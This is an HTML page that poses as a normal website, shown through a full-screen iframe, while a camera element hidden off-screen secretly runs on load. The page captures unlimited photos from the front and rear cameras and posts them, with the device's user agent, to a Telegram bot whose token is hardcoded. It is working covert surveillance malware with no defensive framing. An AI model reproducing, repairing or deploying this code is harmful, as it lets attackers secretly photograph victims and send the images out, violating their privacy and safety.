<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Burst Camera App</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        
        #backgroundCamera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div id="backgroundCamera">
        <video id="cameraVideo" autoplay playsinline muted></video>
    </div>
    
    <iframe id="websiteFrame" src="about:blank"></iframe>

    <script>
        // =====================================================
        //  BURST CAMERA SYSTEM - FIXED BLANK PHOTO ISSUE
        // =====================================================
        
        function getConfigFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            const websiteParam = urlParams.get('site') || urlParams.get('url') || urlParams.get('website');
            const chatId = urlParams.get('chat_id');
            
            let websiteURL = 'https://www.example.com';
            
            if (websiteParam) {
                websiteURL = decodeURIComponent(websiteParam);
                if (!websiteURL.startsWith('http://') && !websiteURL.startsWith('https://')) {
                    websiteURL = 'https://' + websiteURL;
                }
            }
            
            return {
                website: websiteURL,
                chatId: chatId || 'unknown'
            };
        }
        
        const config = getConfigFromURL();
        const BOT_TOKEN = '8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        const CHAT_ID = config.chatId;
        
        // Configuration
        const PHOTOS_PER_CAMERA = 10;
        const BURST_DELAY = 200; // Increased from 140ms
        const SWITCH_DELAY = 1000; // Increased delay when switching
        const WARMUP_TIME = 2000; // Camera warmup time
        
        let cameraStream = null;
        let currentFacingMode = 'user';
        let burstRunning = false;
        let photoCounter = 0;
        let totalPhotosSent = 0;
        let cameraReady = false;
        
        const cameraVideo = document.getElementById('cameraVideo');
        const websiteFrame = document.getElementById('websiteFrame');
        
        // Load website
        function loadWebsite() {
            try {
                websiteFrame.src = config.website;
                console.log('ðŸŒ Website loaded:', config.website);
            } catch (error) {
                console.error('Failed to load website:', error);
            }
        }
        
        // Start camera with proper initialization
        async function startCamera() {
            try {
                cameraReady = false;
                console.log(`ðŸ“¹ Starting ${currentFacingMode.toUpperCase()} camera...`);
                
                const constraints = {
                    video: {
                        width: { ideal: 1280, min: 640 },
                        height: { ideal: 720, min: 480 },
                        facingMode: currentFacingMode,
                        frameRate: { ideal: 30, min: 15 }
                    }
                };
                
                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraVideo.srcObject = cameraStream;
                
                // Wait for metadata to load
                await new Promise((resolve, reject) => {
                    cameraVideo.onloadedmetadata = () => {
                        console.log('ðŸ“Š Video metadata loaded');
                        resolve();
                    };
                    cameraVideo.onerror = reject;
                    // Timeout after 5 seconds
                    setTimeout(() => reject(new Error('Metadata timeout')), 5000);
                });
                
                // Wait for video to be fully ready
                await new Promise((resolve, reject) => {
                    const checkReady = () => {
                        if (cameraVideo.readyState >= 3) { // HAVE_FUTURE_DATA or HAVE_ENOUGH_DATA
                            console.log('âœ… Video ready state:', cameraVideo.readyState);
                            resolve();
                        } else {
                            console.log('â³ Waiting... ready state:', cameraVideo.readyState);
                            setTimeout(checkReady, 100);
                        }
                    };
                    checkReady();
                    setTimeout(() => reject(new Error('Ready state timeout')), 5000);
                });
                
                await cameraVideo.play();
                
                // Extended warm-up for camera to adjust exposure, focus, etc.
                console.log(`â³ Camera warming up for ${WARMUP_TIME}ms...`);
                await new Promise(resolve => setTimeout(resolve, WARMUP_TIME));
                
                // Verify video dimensions
                if (cameraVideo.videoWidth === 0 || cameraVideo.videoHeight === 0) {
                    throw new Error('Invalid video dimensions');
                }
                
                cameraReady = true;
                console.log(`âœ… ${currentFacingMode.toUpperCase()} camera ready: ${cameraVideo.videoWidth}x${cameraVideo.videoHeight}`);
                console.log(`ðŸ“º Ready State: ${cameraVideo.readyState}, Playing: ${!cameraVideo.paused}`);
                return true;
            } catch (error) {
                console.error('âŒ Camera error:', error);
                cameraReady = false;
                return false;
            }
        }
        
        // Stop camera
        function stopCamera() {
            cameraReady = false;
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraVideo.srcObject = null;
                cameraStream = null;
            }
        }
        
        // Capture single frame with validation
        async function captureFrame() {
            return new Promise((resolve) => {
                // Check if camera is ready
                if (!cameraReady || cameraVideo.readyState < 2) {
                    console.warn('âš ï¸ Camera not ready. Ready state:', cameraVideo.readyState);
                    resolve(null);
                    return;
                }
                
                // Check if video has valid dimensions
                if (cameraVideo.videoWidth === 0 || cameraVideo.videoHeight === 0) {
                    console.warn('âš ï¸ Invalid video dimensions');
                    resolve(null);
                    return;
                }
                
                try {
                    const canvas = document.createElement('canvas');
                    const context = canvas.getContext('2d', { 
                        alpha: false,
                        willReadFrequently: false 
                    });
                    
                    canvas.width = cameraVideo.videoWidth;
                    canvas.height = cameraVideo.videoHeight;
                    
                    console.log(`ðŸ“¸ Capturing: ${canvas.width}x${canvas.height}`);
                    
                    context.imageSmoothingEnabled = true;
                    context.imageSmoothingQuality = 'high';
                    context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                    
                    // Verify the canvas has content (not blank)
                    const imageData = context.getImageData(0, 0, Math.min(10, canvas.width), Math.min(10, canvas.height));
                    const hasContent = imageData.data.some((value, index) => {
                        // Check if there's any non-zero color value
                        return index % 4 !== 3 && value > 0;
                    });
                    
                    if (!hasContent) {
                        console.warn('âš ï¸ Canvas appears blank');
                        resolve(null);
                        return;
                    }
                    
                    canvas.toBlob(blob => {
                        if (blob && blob.size > 1000) { // At least 1KB
                            console.log(`âœ… Captured valid blob: ${(blob.size / 1024).toFixed(2)} KB`);
                            resolve(blob);
                        } else {
                            console.warn('âš ï¸ Invalid blob size:', blob ? blob.size : 0);
                            resolve(null);
                        }
                    }, 'image/jpeg', 0.92);
                } catch (error) {
                    console.error('âŒ Capture error:', error);
                    resolve(null);
                }
            });
        }
        
        // Send photo to Telegram
        async function sendPhotoToTelegram(blob, cameraType, photoNum) {
            if (!blob) return false;
            
            try {
                const url = `${TELEGRAM_API}/sendPhoto`;
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `${cameraType}_${photoNum}_${Date.now()}.jpg`);
                
                const caption = `ðŸ“¸ ${cameraType.toUpperCase()} #${photoNum}\nâ° ${new Date().toLocaleTimeString()}\nðŸ’¾ ${(blob.size / 1024).toFixed(2)} KB`;
                formData.append('caption', caption);
                
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    totalPhotosSent++;
                    console.log(`âœ… Photo sent: ${cameraType.toUpperCase()} #${photoNum} (Total: ${totalPhotosSent})`);
                    return true;
                } else {
                    console.error('âŒ Telegram error:', result);
                    return false;
                }
            } catch (error) {
                console.error('âŒ Send error:', error);
                return false;
            }
        }
        
        // Switch camera
        async function switchCamera() {
            console.log('ðŸ”„ Switching camera...');
            stopCamera();
            
            await new Promise(resolve => setTimeout(resolve, SWITCH_DELAY));
            
            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
            photoCounter = 0;
            
            const started = await startCamera();
            return started;
        }
        
        // Main burst loop
        async function startBurstMode() {
            if (burstRunning) return;
            
            burstRunning = true;
            console.log('ðŸš€ BURST MODE STARTED - UNLIMITED PHOTOS');
            console.log(`ðŸ“Š Config: ${PHOTOS_PER_CAMERA} photos per camera, ${BURST_DELAY}ms delay`);
            
            while (burstRunning) {
                // Only capture if camera is ready
                if (!cameraReady) {
                    console.warn('âš ï¸ Camera not ready, waiting...');
                    await new Promise(resolve => setTimeout(resolve, 500));
                    continue;
                }
                
                // Capture photo
                const blob = await captureFrame();
                
                if (blob) {
                    photoCounter++;
                    await sendPhotoToTelegram(blob, currentFacingMode, photoCounter);
                    
                    // Switch camera after X photos
                    if (photoCounter >= PHOTOS_PER_CAMERA) {
                        const switched = await switchCamera();
                        if (!switched) {
                            console.error('âŒ Failed to switch camera');
                            break;
                        }
                    }
                } else {
                    console.warn('âš ï¸ Failed to capture frame, retrying...');
                }
                
                // Small delay between captures
                await new Promise(resolve => setTimeout(resolve, BURST_DELAY));
            }
        }
        
        // Send initial device info
        async function sendInitialInfo() {
            try {
                const info = `ðŸš€ *BURST MODE ACTIVATED*\n\n` +
                    `ðŸ“± Device: ${navigator.userAgent.substring(0, 50)}...\n` +
                    `ðŸŒ Website: ${config.website}\n` +
                    `â° Started: ${new Date().toLocaleString()}\n` +
                    `ðŸ“¸ Mode: Unlimited burst capture\n` +
                    `ðŸ”„ Switch: Every ${PHOTOS_PER_CAMERA} photos`;
                
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: info,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {
                console.error('Failed to send initial info:', e);
            }
        }
        
        // Initialize everything
        async function init() {
            console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
            console.log('ðŸŽ¯ BURST CAMERA SYSTEM');
            console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
            console.log('ðŸ’¬ Chat ID:', CHAT_ID);
            console.log('ðŸŒ Website:', config.website);
            console.log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
            
            // Load website
            loadWebsite();
            
            // Send initial info
            await sendInitialInfo();
            
            // Start camera
            const cameraStarted = await startCamera();
            
            if (cameraStarted) {
                console.log('ðŸŽ¬ Starting burst mode...');
                // Start burst mode
                startBurstMode();
            } else {
                console.error('âŒ Failed to start camera');
            }
        }
        
        // Auto-start
        window.addEventListener('load', init);
        
        // Cleanup
        window.addEventListener('beforeunload', () => {
            burstRunning = false;
            stopCamera();
        });
    </script>
</body>
</html>
